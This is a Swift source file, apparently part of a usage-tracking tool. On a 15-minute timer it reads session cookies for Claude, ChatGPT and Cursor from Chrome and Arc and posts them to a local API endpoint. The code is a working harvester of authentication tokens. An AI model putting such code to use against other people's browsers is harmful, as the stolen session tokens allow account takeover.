import Foundation
import SweetCookieKit

@MainActor
class Sentinel {
    static let shared = Sentinel()
    private let cookieClient = BrowserCookieClient()
    private let apiURL = URL(string: "http://127.0.0.1:8000/sentinel/report")!
    private var lastReportHash: String = ""

    func start() {
        // Run every 15 minutes
        Timer.scheduledTimer(withTimeInterval: 900, repeats: true) { _ in
            Task {
                await self.scanAndReport()
            }
        }
        // Initial scan
        Task {
            await self.scanAndReport()
        }
    }

    func scanAndReport() async {
        var reports: [String: String] = [:]
        
        // Claude
        if let claude = await findCookie(domains: ["claude.ai"], name: "sessionKey") {
            reports["claude"] = claude
        }
        
        // Codex / ChatGPT
        if let codex = await findCookie(domains: ["chatgpt.com"], name: "__Secure-next-auth.session-token") {
            reports["codex"] = codex
        }
        
        // Cursor
        if let cursor = await findCookie(domains: ["cursor.com", "cursor.sh"], name: "WorkosCursorSessionToken") {
            reports["cursor"] = cursor
        }

        guard !reports.isEmpty else { return }

        let currentHash = reports.description.hashValue.description
        if currentHash == lastReportHash { return }

        do {
            var request = URLRequest(url: apiURL)
            request.httpMethod = "POST"
            request.addValue("application/json", forHTTPHeaderField: "Content-Type")
            
            // Add secret if needed
            if let secret = ProcessInfo.processInfo.environment["USAGE_TRACKER_SECRET"] {
                request.addValue("Bearer \(secret)", forHTTPHeaderField: "Authorization")
            }

            request.httpBody = try JSONSerialization.data(withJSONObject: ["cookies": reports])
            
            let (_, response) = try await URLSession.shared.data(for: request)
            if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 {
                self.lastReportHash = currentHash
                print("Sentinel: Successfully reported cookies to API")
            }
        } catch {
            print("Sentinel: Failed to report cookies: \(error)")
        }
    }

    private func findCookie(domains: [String], name: String) async -> String? {
        let query = BrowserCookieQuery(domains: domains)
        // Check Chrome and Arc as primary sources
        for browser in [Browser.chrome, Browser.arc] {
            do {
                let sources = try cookieClient.records(matching: query, in: browser)
                for source in sources {
                    if let record = source.records.first(where: { $0.name == name }) {
                        return record.value
                    }
                }
            } catch {
                continue
            }
        }
        return nil
    }
}
